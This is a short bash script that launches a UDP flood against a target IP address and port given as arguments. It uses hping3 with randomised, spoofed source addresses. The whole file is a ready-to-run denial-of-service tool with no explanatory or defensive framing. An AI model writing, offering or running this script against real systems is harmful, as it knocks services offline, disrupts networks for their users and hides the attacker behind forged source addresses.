#!/bin/bash
TARGET_IP=$1
TARGET_PORT=$2
hping3 --rand-source --udp --flood $TARGET_IP -p $TARGET_PORT
